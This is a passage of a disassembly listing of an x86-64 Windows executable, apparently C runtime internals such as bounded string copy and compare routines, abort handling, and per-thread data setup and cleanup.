   140005d1c:	48 8d 15 2d b9 00 00 	lea    0xb92d(%rip),%rdx        # 0x140011650
   140005d23:	48 8d 0d 26 b8 00 00 	lea    0xb826(%rip),%rcx        # 0x140011550
   140005d2a:	e9 bd 44 00 00       	jmp    0x14000a1ec
   140005d2f:	cc                   	int3
   140005d30:	48 83 ec 28          	sub    $0x28,%rsp
   140005d34:	84 c9                	test   %cl,%cl
   140005d36:	74 16                	je     0x140005d4e
   140005d38:	48 83 3d e8 5e 01 00 	cmpq   $0x0,0x15ee8(%rip)        # 0x14001bc28
   140005d3f:	00 
   140005d40:	74 05                	je     0x140005d47
   140005d42:	e8 55 4c 00 00       	call   0x14000a99c
   140005d47:	b0 01                	mov    $0x1,%al
   140005d49:	48 83 c4 28          	add    $0x28,%rsp
   140005d4d:	c3                   	ret
   140005d4e:	48 8d 15 fb b8 00 00 	lea    0xb8fb(%rip),%rdx        # 0x140011650
   140005d55:	48 8d 0d f4 b7 00 00 	lea    0xb7f4(%rip),%rcx        # 0x140011550
   140005d5c:	48 83 c4 28          	add    $0x28,%rsp
   140005d60:	e9 1b 45 00 00       	jmp    0x14000a280
   140005d65:	cc                   	int3
   140005d66:	cc                   	int3
   140005d67:	cc                   	int3
   140005d68:	48 83 ec 28          	sub    $0x28,%rsp
   140005d6c:	e8 23 06 00 00       	call   0x140006394
   140005d71:	48 8b 40 18          	mov    0x18(%rax),%rax
   140005d75:	48 85 c0             	test   %rax,%rax
   140005d78:	74 12                	je     0x140005d8c
   140005d7a:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140005d81:	3e f1 85 
   140005d84:	ff 15 36 a5 00 00    	call   *0xa536(%rip)        # 0x1400102c0
   140005d8a:	eb 00                	jmp    0x140005d8c
   140005d8c:	e8 7f 00 00 00       	call   0x140005e10
   140005d91:	90                   	nop
   140005d92:	cc                   	int3
   140005d93:	cc                   	int3
   140005d94:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   140005d9b:	00 
   140005d9c:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140005da0:	e9 a7 0e 00 00       	jmp    0x140006c4c
   140005da5:	cc                   	int3
   140005da6:	cc                   	int3
   140005da7:	cc                   	int3
   140005da8:	e9 fb 37 00 00       	jmp    0x1400095a8
   140005dad:	cc                   	int3
   140005dae:	cc                   	int3
   140005daf:	cc                   	int3
   140005db0:	40 53                	rex push %rbx
   140005db2:	48 83 ec 20          	sub    $0x20,%rsp
   140005db6:	33 db                	xor    %ebx,%ebx
   140005db8:	48 85 c9             	test   %rcx,%rcx
   140005dbb:	74 0c                	je     0x140005dc9
   140005dbd:	48 85 d2             	test   %rdx,%rdx
   140005dc0:	74 07                	je     0x140005dc9
   140005dc2:	4d 85 c0             	test   %r8,%r8
   140005dc5:	75 1b                	jne    0x140005de2
   140005dc7:	88 19                	mov    %bl,(%rcx)
   140005dc9:	e8 e6 0d 00 00       	call   0x140006bb4
   140005dce:	bb 16 00 00 00       	mov    $0x16,%ebx
   140005dd3:	89 18                	mov    %ebx,(%rax)
   140005dd5:	e8 9e 0c 00 00       	call   0x140006a78
   140005dda:	8b c3                	mov    %ebx,%eax
   140005ddc:	48 83 c4 20          	add    $0x20,%rsp
   140005de0:	5b                   	pop    %rbx
   140005de1:	c3                   	ret
   140005de2:	4c 8b c9             	mov    %rcx,%r9
   140005de5:	4c 2b c1             	sub    %rcx,%r8
   140005de8:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   140005dec:	41 88 01             	mov    %al,(%r9)
   140005def:	49 ff c1             	inc    %r9
   140005df2:	84 c0                	test   %al,%al
   140005df4:	74 e4                	je     0x140005dda
   140005df6:	48 83 ea 01          	sub    $0x1,%rdx
   140005dfa:	75 ec                	jne    0x140005de8
   140005dfc:	48 85 d2             	test   %rdx,%rdx
   140005dff:	75 d9                	jne    0x140005dda
   140005e01:	88 19                	mov    %bl,(%rcx)
   140005e03:	e8 ac 0d 00 00       	call   0x140006bb4
   140005e08:	bb 22 00 00 00       	mov    $0x22,%ebx
   140005e0d:	eb c4                	jmp    0x140005dd3
   140005e0f:	cc                   	int3
   140005e10:	48 83 ec 28          	sub    $0x28,%rsp
   140005e14:	e8 77 45 00 00       	call   0x14000a390
   140005e19:	48 85 c0             	test   %rax,%rax
   140005e1c:	74 0a                	je     0x140005e28
   140005e1e:	b9 16 00 00 00       	mov    $0x16,%ecx
   140005e23:	e8 b8 45 00 00       	call   0x14000a3e0
   140005e28:	f6 05 51 42 01 00 02 	testb  $0x2,0x14251(%rip)        # 0x14001a080
   140005e2f:	74 2a                	je     0x140005e5b
   140005e31:	b9 17 00 00 00       	mov    $0x17,%ecx
   140005e36:	ff 15 4c a2 00 00    	call   *0xa24c(%rip)        # 0x140010088
   140005e3c:	85 c0                	test   %eax,%eax
   140005e3e:	74 07                	je     0x140005e47
   140005e40:	b9 07 00 00 00       	mov    $0x7,%ecx
   140005e45:	cd 29                	int    $0x29
   140005e47:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005e4d:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140005e52:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140005e56:	e8 51 09 00 00       	call   0x1400067ac
   140005e5b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005e60:	e8 5b f7 ff ff       	call   0x1400055c0
   140005e65:	cc                   	int3
   140005e66:	cc                   	int3
   140005e67:	cc                   	int3
   140005e68:	e9 67 0d 00 00       	jmp    0x140006bd4
   140005e6d:	cc                   	int3
   140005e6e:	cc                   	int3
   140005e6f:	cc                   	int3
   140005e70:	40 57                	rex push %rdi
   140005e72:	48 83 ec 20          	sub    $0x20,%rsp
   140005e76:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140005e7a:	48 8b f9             	mov    %rcx,%rdi
   140005e7d:	75 49                	jne    0x140005ec8
   140005e7f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140005e84:	ff 15 4e a2 00 00    	call   *0xa24e(%rip)        # 0x1400100d8
   140005e8a:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   140005e8e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140005e92:	75 0c                	jne    0x140005ea0
   140005e94:	33 d2                	xor    %edx,%edx
   140005e96:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   140005e9a:	48 89 57 08          	mov    %rdx,0x8(%rdi)
   140005e9e:	eb 04                	jmp    0x140005ea4
   140005ea0:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   140005ea4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005ea9:	e8 26 07 00 00       	call   0x1400065d4
   140005eae:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140005eb2:	48 8b d8             	mov    %rax,%rbx
   140005eb5:	48 89 07             	mov    %rax,(%rdi)
   140005eb8:	ff 15 22 a2 00 00    	call   *0xa222(%rip)        # 0x1400100e0
   140005ebe:	48 85 db             	test   %rbx,%rbx
   140005ec1:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005ec6:	74 09                	je     0x140005ed1
   140005ec8:	48 8b 07             	mov    (%rdi),%rax
   140005ecb:	48 83 c4 20          	add    $0x20,%rsp
   140005ecf:	5f                   	pop    %rdi
   140005ed0:	c3                   	ret
   140005ed1:	e8 3a ff ff ff       	call   0x140005e10
   140005ed6:	cc                   	int3
   140005ed7:	cc                   	int3
   140005ed8:	cc                   	int3
   140005ed9:	cc                   	int3
   140005eda:	cc                   	int3
   140005edb:	cc                   	int3
   140005edc:	cc                   	int3
   140005edd:	cc                   	int3
   140005ede:	cc                   	int3
   140005edf:	cc                   	int3
   140005ee0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005ee5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005eea:	57                   	push   %rdi
   140005eeb:	48 83 ec 20          	sub    $0x20,%rsp
   140005eef:	48 8b f9             	mov    %rcx,%rdi
   140005ef2:	e8 79 ff ff ff       	call   0x140005e70
   140005ef7:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   140005efb:	48 8b c8             	mov    %rax,%rcx
   140005efe:	48 8b f0             	mov    %rax,%rsi
   140005f01:	4c 8b 80 90 00 00 00 	mov    0x90(%rax),%r8
   140005f08:	4c 89 02             	mov    %r8,(%rdx)
   140005f0b:	4c 8b 80 88 00 00 00 	mov    0x88(%rax),%r8
   140005f12:	4c 89 47 20          	mov    %r8,0x20(%rdi)
   140005f16:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   140005f1a:	e8 4d 4c 00 00       	call   0x14000ab6c
   140005f1f:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   140005f23:	48 8d 57 20          	lea    0x20(%rdi),%rdx
   140005f27:	48 8b ce             	mov    %rsi,%rcx
   140005f2a:	e8 a9 4c 00 00       	call   0x14000abd8
   140005f2f:	8b 86 a8 03 00 00    	mov    0x3a8(%rsi),%eax
   140005f35:	a8 02                	test   $0x2,%al
   140005f37:	75 0d                	jne    0x140005f46
   140005f39:	83 c8 02             	or     $0x2,%eax
   140005f3c:	89 86 a8 03 00 00    	mov    %eax,0x3a8(%rsi)
   140005f42:	c6 47 28 02          	movb   $0x2,0x28(%rdi)
   140005f46:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f4b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005f50:	48 83 c4 20          	add    $0x20,%rsp
   140005f54:	5f                   	pop    %rdi
   140005f55:	c3                   	ret
   140005f56:	cc                   	int3
   140005f57:	cc                   	int3
   140005f58:	cc                   	int3
   140005f59:	cc                   	int3
   140005f5a:	cc                   	int3
   140005f5b:	cc                   	int3
   140005f5c:	cc                   	int3
   140005f5d:	cc                   	int3
   140005f5e:	cc                   	int3
   140005f5f:	cc                   	int3
   140005f60:	cc                   	int3
   140005f61:	cc                   	int3
   140005f62:	cc                   	int3
   140005f63:	cc                   	int3
   140005f64:	cc                   	int3
   140005f65:	cc                   	int3
   140005f66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140005f6d:	00 00 00 
   140005f70:	48 2b d1             	sub    %rcx,%rdx
   140005f73:	4d 85 c0             	test   %r8,%r8
   140005f76:	74 6a                	je     0x140005fe2
   140005f78:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   140005f7e:	74 1d                	je     0x140005f9d
   140005f80:	0f b6 01             	movzbl (%rcx),%eax
   140005f83:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140005f86:	75 5d                	jne    0x140005fe5
   140005f88:	48 ff c1             	inc    %rcx
   140005f8b:	49 ff c8             	dec    %r8
   140005f8e:	74 52                	je     0x140005fe2
   140005f90:	84 c0                	test   %al,%al
   140005f92:	74 4e                	je     0x140005fe2
   140005f94:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   140005f9b:	75 e3                	jne    0x140005f80
   140005f9d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   140005fa4:	80 80 80 
   140005fa7:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   140005fae:	fe fe fe 
   140005fb1:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   140005fb4:	25 ff 0f 00 00       	and    $0xfff,%eax
   140005fb9:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   140005fbe:	77 c0                	ja     0x140005f80
   140005fc0:	48 8b 01             	mov    (%rcx),%rax
   140005fc3:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140005fc7:	75 b7                	jne    0x140005f80
   140005fc9:	48 83 c1 08          	add    $0x8,%rcx
   140005fcd:	49 83 e8 08          	sub    $0x8,%r8
   140005fd1:	76 0f                	jbe    0x140005fe2
   140005fd3:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   140005fd7:	48 f7 d0             	not    %rax
   140005fda:	49 23 c1             	and    %r9,%rax
   140005fdd:	49 85 c3             	test   %rax,%r11
   140005fe0:	74 cf                	je     0x140005fb1
   140005fe2:	33 c0                	xor    %eax,%eax
   140005fe4:	c3                   	ret
   140005fe5:	48 1b c0             	sbb    %rax,%rax
   140005fe8:	48 83 c8 01          	or     $0x1,%rax
   140005fec:	c3                   	ret
   140005fed:	cc                   	int3
   140005fee:	cc                   	int3
   140005fef:	cc                   	int3
   140005ff0:	4d 85 c0             	test   %r8,%r8
   140005ff3:	75 18                	jne    0x14000600d
   140005ff5:	33 c0                	xor    %eax,%eax
   140005ff7:	c3                   	ret
   140005ff8:	0f b7 01             	movzwl (%rcx),%eax
   140005ffb:	66 85 c0             	test   %ax,%ax
   140005ffe:	74 13                	je     0x140006013
   140006000:	66 3b 02             	cmp    (%rdx),%ax
   140006003:	75 0e                	jne    0x140006013
   140006005:	48 83 c1 02          	add    $0x2,%rcx
   140006009:	48 83 c2 02          	add    $0x2,%rdx
   14000600d:	49 83 e8 01          	sub    $0x1,%r8
   140006011:	75 e5                	jne    0x140005ff8
   140006013:	0f b7 01             	movzwl (%rcx),%eax
   140006016:	0f b7 0a             	movzwl (%rdx),%ecx
   140006019:	2b c1                	sub    %ecx,%eax
   14000601b:	c3                   	ret
   14000601c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006021:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006026:	57                   	push   %rdi
   140006027:	48 83 ec 20          	sub    $0x20,%rsp
   14000602b:	49 8b d9             	mov    %r9,%rbx
   14000602e:	49 8b f8             	mov    %r8,%rdi
   140006031:	8b 0a                	mov    (%rdx),%ecx
   140006033:	e8 34 2c 00 00       	call   0x140008c6c
   140006038:	90                   	nop
   140006039:	48 8b 07             	mov    (%rdi),%rax
   14000603c:	48 8b 08             	mov    (%rax),%rcx
   14000603f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006046:	f0 ff 00             	lock incl (%rax)
   140006049:	8b 0b                	mov    (%rbx),%ecx
   14000604b:	e8 70 2c 00 00       	call   0x140008cc0
   140006050:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006055:	48 83 c4 20          	add    $0x20,%rsp
   140006059:	5f                   	pop    %rdi
   14000605a:	c3                   	ret
   14000605b:	cc                   	int3
   14000605c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006061:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006066:	57                   	push   %rdi
   140006067:	48 83 ec 20          	sub    $0x20,%rsp
   14000606b:	49 8b d9             	mov    %r9,%rbx
   14000606e:	49 8b f8             	mov    %r8,%rdi
   140006071:	8b 0a                	mov    (%rdx),%ecx
   140006073:	e8 f4 2b 00 00       	call   0x140008c6c
   140006078:	90                   	nop
   140006079:	48 8b 0f             	mov    (%rdi),%rcx
   14000607c:	33 d2                	xor    %edx,%edx
   14000607e:	48 8b 09             	mov    (%rcx),%rcx
   140006081:	e8 a6 02 00 00       	call   0x14000632c
   140006086:	90                   	nop
   140006087:	8b 0b                	mov    (%rbx),%ecx
   140006089:	e8 32 2c 00 00       	call   0x140008cc0
   14000608e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006093:	48 83 c4 20          	add    $0x20,%rsp
   140006097:	5f                   	pop    %rdi
   140006098:	c3                   	ret
   140006099:	cc                   	int3
   14000609a:	cc                   	int3
   14000609b:	cc                   	int3
   14000609c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400060a1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400060a6:	57                   	push   %rdi
   1400060a7:	48 83 ec 20          	sub    $0x20,%rsp
   1400060ab:	49 8b d9             	mov    %r9,%rbx
   1400060ae:	49 8b f8             	mov    %r8,%rdi
   1400060b1:	8b 0a                	mov    (%rdx),%ecx
   1400060b3:	e8 b4 2b 00 00       	call   0x140008c6c
   1400060b8:	90                   	nop
   1400060b9:	48 8b 47 08          	mov    0x8(%rdi),%rax
   1400060bd:	48 8b 10             	mov    (%rax),%rdx
   1400060c0:	48 8b 0f             	mov    (%rdi),%rcx
   1400060c3:	48 8b 12             	mov    (%rdx),%rdx
   1400060c6:	48 8b 09             	mov    (%rcx),%rcx
   1400060c9:	e8 5e 02 00 00       	call   0x14000632c
   1400060ce:	90                   	nop
   1400060cf:	8b 0b                	mov    (%rbx),%ecx
   1400060d1:	e8 ea 2b 00 00       	call   0x140008cc0
   1400060d6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400060db:	48 83 c4 20          	add    $0x20,%rsp
   1400060df:	5f                   	pop    %rdi
   1400060e0:	c3                   	ret
   1400060e1:	cc                   	int3
   1400060e2:	cc                   	int3
   1400060e3:	cc                   	int3
   1400060e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400060e9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400060ee:	57                   	push   %rdi
   1400060ef:	48 83 ec 20          	sub    $0x20,%rsp
   1400060f3:	49 8b d9             	mov    %r9,%rbx
   1400060f6:	49 8b f8             	mov    %r8,%rdi
   1400060f9:	8b 0a                	mov    (%rdx),%ecx
   1400060fb:	e8 6c 2b 00 00       	call   0x140008c6c
   140006100:	90                   	nop
   140006101:	48 8b 07             	mov    (%rdi),%rax
   140006104:	48 8b 08             	mov    (%rax),%rcx
   140006107:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   14000610e:	48 85 c9             	test   %rcx,%rcx
   140006111:	74 1e                	je     0x140006131
   140006113:	83 c8 ff             	or     $0xffffffff,%eax
   140006116:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000611a:	83 f8 01             	cmp    $0x1,%eax
   14000611d:	75 12                	jne    0x140006131
   14000611f:	48 8d 05 7a 3f 01 00 	lea    0x13f7a(%rip),%rax        # 0x14001a0a0
   140006126:	48 3b c8             	cmp    %rax,%rcx
   140006129:	74 06                	je     0x140006131
   14000612b:	e8 1c 0b 00 00       	call   0x140006c4c
   140006130:	90                   	nop
   140006131:	8b 0b                	mov    (%rbx),%ecx
   140006133:	e8 88 2b 00 00       	call   0x140008cc0
   140006138:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000613d:	48 83 c4 20          	add    $0x20,%rsp
   140006141:	5f                   	pop    %rdi
   140006142:	c3                   	ret
   140006143:	cc                   	int3
   140006144:	40 55                	rex push %rbp
   140006146:	48 8b ec             	mov    %rsp,%rbp
   140006149:	48 83 ec 50          	sub    $0x50,%rsp
   14000614d:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140006151:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006155:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140006159:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   14000615d:	ba 01 00 00 00       	mov    $0x1,%edx
   140006162:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140006166:	b8 05 00 00 00       	mov    $0x5,%eax
   14000616b:	89 45 20             	mov    %eax,0x20(%rbp)
   14000616e:	89 45 28             	mov    %eax,0x28(%rbp)
   140006171:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006175:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006179:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   14000617d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006181:	b8 04 00 00 00       	mov    $0x4,%eax
   140006186:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140006189:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000618c:	48 8d 05 a5 58 01 00 	lea    0x158a5(%rip),%rax        # 0x14001ba38
   140006193:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140006197:	89 51 28             	mov    %edx,0x28(%rcx)
   14000619a:	48 8d 0d 0f b2 00 00 	lea    0xb20f(%rip),%rcx        # 0x1400113b0
   1400061a1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400061a5:	48 89 08             	mov    %rcx,(%rax)
   1400061a8:	48 8d 0d f1 3e 01 00 	lea    0x13ef1(%rip),%rcx        # 0x14001a0a0
   1400061af:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400061b3:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   1400061b9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400061bd:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400061c4:	8d 4a 42             	lea    0x42(%rdx),%ecx
   1400061c7:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400061cb:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   1400061cf:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   1400061d6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400061da:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   1400061e1:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400061e5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400061e9:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   1400061f0:	00 
   1400061f1:	e8 26 fe ff ff       	call   0x14000601c
   1400061f6:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   1400061fa:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1400061fe:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140006202:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006206:	e8 91 fe ff ff       	call   0x14000609c
   14000620b:	48 83 c4 50          	add    $0x50,%rsp
   14000620f:	5d                   	pop    %rbp
   140006210:	c3                   	ret
   140006211:	cc                   	int3
   140006212:	cc                   	int3
   140006213:	cc                   	int3
   140006214:	48 85 c9             	test   %rcx,%rcx
   140006217:	74 1a                	je     0x140006233
   140006219:	53                   	push   %rbx
   14000621a:	48 83 ec 20          	sub    $0x20,%rsp
   14000621e:	48 8b d9             	mov    %rcx,%rbx
   140006221:	e8 0e 00 00 00       	call   0x140006234
   140006226:	48 8b cb             	mov    %rbx,%rcx
   140006229:	e8 1e 0a 00 00       	call   0x140006c4c
   14000622e:	48 83 c4 20          	add    $0x20,%rsp
   140006232:	5b                   	pop    %rbx
   140006233:	c3                   	ret
   140006234:	40 55                	rex push %rbp
   140006236:	48 8b ec             	mov    %rsp,%rbp
   140006239:	48 83 ec 40          	sub    $0x40,%rsp
   14000623d:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140006241:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140006245:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006249:	48 8d 15 60 b1 00 00 	lea    0xb160(%rip),%rdx        # 0x1400113b0
   140006250:	b8 05 00 00 00       	mov    $0x5,%eax
   140006255:	89 45 20             	mov    %eax,0x20(%rbp)
   140006258:	89 45 28             	mov    %eax,0x28(%rbp)
   14000625b:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000625f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006263:	b8 04 00 00 00       	mov    $0x4,%eax
   140006268:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000626b:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000626e:	48 8b 01             	mov    (%rcx),%rax
   140006271:	48 3b c2             	cmp    %rdx,%rax
   140006274:	74 0c                	je     0x140006282
   140006276:	48 8b c8             	mov    %rax,%rcx
   140006279:	e8 ce 09 00 00       	call   0x140006c4c
   14000627e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006282:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140006286:	e8 c1 09 00 00       	call   0x140006c4c
   14000628b:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000628f:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   140006293:	e8 b4 09 00 00       	call   0x140006c4c
   140006298:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000629c:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   1400062a0:	e8 a7 09 00 00       	call   0x140006c4c
   1400062a5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400062a9:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1400062ad:	e8 9a 09 00 00       	call   0x140006c4c
   1400062b2:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400062b6:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   1400062ba:	e8 8d 09 00 00       	call   0x140006c4c
   1400062bf:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400062c3:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   1400062c7:	e8 80 09 00 00       	call   0x140006c4c
   1400062cc:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400062d0:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   1400062d4:	e8 73 09 00 00       	call   0x140006c4c
   1400062d9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400062dd:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1400062e4:	e8 63 09 00 00       	call   0x140006c4c
   1400062e9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400062ed:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   1400062f4:	e8 53 09 00 00       	call   0x140006c4c
   1400062f9:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   1400062fd:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140006301:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140006305:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006309:	e8 d6 fd ff ff       	call   0x1400060e4
   14000630e:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140006312:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140006316:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000631a:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000631e:	e8 39 fd ff ff       	call   0x14000605c
   140006323:	48 83 c4 40          	add    $0x40,%rsp
   140006327:	5d                   	pop    %rbp
   140006328:	c3                   	ret
   140006329:	cc                   	int3
   14000632a:	cc                   	int3
   14000632b:	cc                   	int3
   14000632c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006331:	57                   	push   %rdi
   140006332:	48 83 ec 20          	sub    $0x20,%rsp
   140006336:	48 8b f9             	mov    %rcx,%rdi
   140006339:	48 8b da             	mov    %rdx,%rbx
   14000633c:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   140006343:	48 85 c9             	test   %rcx,%rcx
   140006346:	74 2c                	je     0x140006374
   140006348:	e8 d7 36 00 00       	call   0x140009a24
   14000634d:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140006354:	48 3b 0d dd 56 01 00 	cmp    0x156dd(%rip),%rcx        # 0x14001ba38
   14000635b:	74 17                	je     0x140006374
   14000635d:	48 8d 05 7c 42 01 00 	lea    0x1427c(%rip),%rax        # 0x14001a5e0
   140006364:	48 3b c8             	cmp    %rax,%rcx
   140006367:	74 0b                	je     0x140006374
   140006369:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   14000636d:	75 05                	jne    0x140006374
   14000636f:	e8 b0 34 00 00       	call   0x140009824
   140006374:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   14000637b:	48 85 db             	test   %rbx,%rbx
   14000637e:	74 08                	je     0x140006388
   140006380:	48 8b cb             	mov    %rbx,%rcx
   140006383:	e8 10 34 00 00       	call   0x140009798
   140006388:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000638d:	48 83 c4 20          	add    $0x20,%rsp
   140006391:	5f                   	pop    %rdi
   140006392:	c3                   	ret
   140006393:	cc                   	int3
   140006394:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006399:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000639e:	57                   	push   %rdi
   14000639f:	48 83 ec 20          	sub    $0x20,%rsp
   1400063a3:	ff 15 2f 9d 00 00    	call   *0x9d2f(%rip)        # 0x1400100d8
   1400063a9:	8b 0d e1 3c 01 00    	mov    0x13ce1(%rip),%ecx        # 0x14001a090
   1400063af:	33 f6                	xor    %esi,%esi
   1400063b1:	8b d8                	mov    %eax,%ebx
   1400063b3:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400063b6:	74 1d                	je     0x1400063d5
   1400063b8:	e8 3b 3b 00 00       	call   0x140009ef8
   1400063bd:	48 8b f8             	mov    %rax,%rdi
   1400063c0:	48 85 c0             	test   %rax,%rax
   1400063c3:	74 0a                	je     0x1400063cf
   1400063c5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400063c9:	48 0f 44 fe          	cmove  %rsi,%rdi
   1400063cd:	eb 72                	jmp    0x140006441
   1400063cf:	8b 0d bb 3c 01 00    	mov    0x13cbb(%rip),%ecx        # 0x14001a090
   1400063d5:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400063d9:	e8 22 3b 00 00       	call   0x140009f00
   1400063de:	85 c0                	test   %eax,%eax
   1400063e0:	75 05                	jne    0x1400063e7
   1400063e2:	48 8b fe             	mov    %rsi,%rdi
   1400063e5:	eb 5a                	jmp    0x140006441
   1400063e7:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400063ec:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400063f1:	e8 de 07 00 00       	call   0x140006bd4
   1400063f6:	8b 0d 94 3c 01 00    	mov    0x13c94(%rip),%ecx        # 0x14001a090
   1400063fc:	48 8b f8             	mov    %rax,%rdi
   1400063ff:	48 85 c0             	test   %rax,%rax
   140006402:	75 10                	jne    0x140006414
   140006404:	33 d2                	xor    %edx,%edx
